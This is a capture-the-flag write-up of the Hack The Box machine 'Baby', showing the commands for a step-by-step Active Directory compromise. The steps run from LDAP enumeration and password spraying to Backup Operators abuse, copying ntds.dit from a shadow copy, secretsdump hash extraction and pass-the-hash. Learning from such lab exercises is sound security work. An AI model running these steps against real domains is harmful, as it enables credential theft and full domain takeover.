# Baby — HTB

> Windows Server 2022 | Active Directory | Backup Operators → ntds.dit
>
> I work in industrial OT/IT integration during the day and I'm teaching myself offensive security in the evenings. This one is rated easy and it is — once you know what you're looking at. The foothold took me maybe 10 minutes. The rest of the evening was understanding *why* each step works, which is the whole point.

---

## The Setup

Single Windows Server 2022 domain controller. Domain: `baby.vl`. WinRM open on 5985, LDAP on 389, SMB with signing required. Standard DC fingerprint.

```
53    DNS
88    Kerberos
389   LDAP
445   SMB (signing required)
5985  WinRM  ← shell target
3389  RDP
```

SMB signing required means NTLM relay is off the table. Doesn't matter here, but worth noting.

---

## Foothold — Password in Plain Sight

LDAP allows anonymous bind by default on AD. That means you can query user attributes — including `description` — without credentials.

```bash
ldapsearch -x -H ldap://baby.vl -b "DC=baby,DC=vl" \
  "(&(objectClass=user)(objectCategory=person))" \
  sAMAccountName description
```

One user has this in their description field:

```
description: Set initial password to BabyStart123!
```

Classic onboarding mistake. Someone added the temporary password directly to the AD object instead of sending it privately.

Password spray across all users doesn't get a clean hit — most have already changed their password. But one user comes back with something different:

```bash
rpcclient -U 'Caroline.Robinson%BabyStart123!' baby.vl
# NT_STATUS_PASSWORD_MUST_CHANGE
```

Not a failed login. The credentials are valid — the account just requires a password change on first login.

### Changing the password

The right tool here is `smbpasswd` with the `-r` flag:

```bash
smbpasswd -r baby.vl -U Caroline.Robinson
# Old SMB password: BabyStart123!
# New SMB password: <new>
# Password changed for user Caroline.Robinson
```

Why `smbpasswd` and not `rpcclient setuserinfo2` or netexec? Because `rpcclient` needs an active authenticated session first, which you can't establish when the account is in `PASSWORD_MUST_CHANGE` state. `smbpasswd -r` implements the SAMR `ChangePasswordUser2` call directly — it uses the old password as auth to set the new one without needing a session. It's the one tool that handles this exact case cleanly.

```bash
evil-winrm -i baby.vl -u Caroline.Robinson -p <new_password>
```

Shell.

---

## Privilege Escalation — Backup Operators

```powershell
net user Caroline.Robinson
# Local Group Memberships: *Backup Operators
```

```powershell
whoami /priv
# SeBackupPrivilege    Enabled
# SeRestorePrivilege   Enabled
```

**Backup Operators** is a built-in Windows group that exists to let backup software read any file on the system regardless of ACLs. The two privileges it grants:

- `SeBackupPrivilege` — read any file, bypassing DACL checks
- `SeRestorePrivilege` — write anywhere, bypassing DACL checks

In practice, anyone with these privileges can read files that should be inaccessible. Including the Active Directory database.

### First attempt — SAM hive

```powershell
reg save hklm\sam sam
reg save hklm\system system
download sam sam
download system system
```

```bash
impacket-secretsdump -sam sam -system system local
# Administrator:500:...:8d992faed38128ae85e95fa35868bb43:::
```

Got a hash. Tried it:

```bash
netexec smb baby.vl -u Administrator -H 8d992faed38128ae85e95fa35868bb43
# STATUS_LOGON_FAILURE
```

Doesn't work. This is the **local** Administrator hash from SAM — the local account database. On a Domain Controller, the domain Administrator is a different object stored in `ntds.dit`, not SAM. Two separate account stores, two different hashes.

### The real target — ntds.dit

`ntds.dit` is the AD database. Every domain user, every hash, everything. The problem is it's locked by the `lsass.exe` process 24/7 — you can't copy a file that's held open by the OS.

The solution is Volume Shadow Copy (VSS) — create a snapshot of the entire C: drive at a point in time. The snapshot isn't locked because it's not the live volume.

**Create the diskshadow script:**

```
set verbose on
set metadata C:\Windows\Temp\test.cab
set context persistent
add volume C: alias cdrive
create
expose %cdrive% E:
```

One thing that will silently break this: line endings. Windows expects CRLF (`\r\n`), Linux files use LF (`\n`). Diskshadow parses the script file and chokes on Unix line endings.

```bash
unix2dos script.txt
```

Then upload and run:

```powershell
upload script.txt script.txt
diskshadow /s script.txt
# The shadow copy was successfully exposed as E:\
```

Copy ntds.dit from the snapshot using `robocopy /b` — the `/b` flag invokes backup mode which uses `SeBackupPrivilege` to bypass ACL on the file:

```powershell
robocopy /b E:\Windows\ntds . ntds.dit
download ntds.dit ntds.dit
```

### Dump the domain hashes

```bash
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

`LOCAL` means parse local files, not connect remotely. `secretsdump` uses the SYSTEM hive to extract the SYSKEY (boot key), which is required to decrypt the hashes stored in ntds.dit — they're encrypted at rest with a key derived from SYSKEY.

```
Administrator:500:...:ee4457ae59f1e3fbd764e33d9cef123d:::
```

Different hash. Try it:

```bash
netexec smb baby.vl -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
# Pwn3d!
```

---

## Root

```bash
evil-winrm -i baby.vl -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
```

Done.

---

## Attack Chain

```
LDAP anonymous bind
  → password in description field → BabyStart123!
  → spray → NT_STATUS_PASSWORD_MUST_CHANGE on Caroline.Robinson
  → smbpasswd -r (handles expired-state accounts)
  → Evil-WinRM shell
  → Backup Operators → SeBackupPrivilege + SeRestorePrivilege
  → SAM dump → local Admin hash → doesn't work (wrong account store)
  → diskshadow VSS snapshot → robocopy /b ntds.dit
  → secretsdump LOCAL → domain Admin hash
  → Pass-the-Hash → Administrator
```

---

## Notes for the Playbook

**`smbpasswd -r` for `PASSWORD_MUST_CHANGE`:** This state trips up most tools. Netexec doesn't have a module for it, rpcclient needs an existing session. `smbpasswd -r` is the one that works.

**SAM ≠ ntds.dit on a DC:** Local hashes from SAM are almost always useless for domain PtH. On a DC, everything that matters is in ntds.dit.

**`unix2dos` before uploading scripts:** Diskshadow, batch files, and several other Windows tools are sensitive to line endings. Get in the habit.

**Backup Operators = DA-equivalent for practical purposes:** The group doesn't sound dangerous. It is. Anyone in it can dump ntds.dit and own the domain.
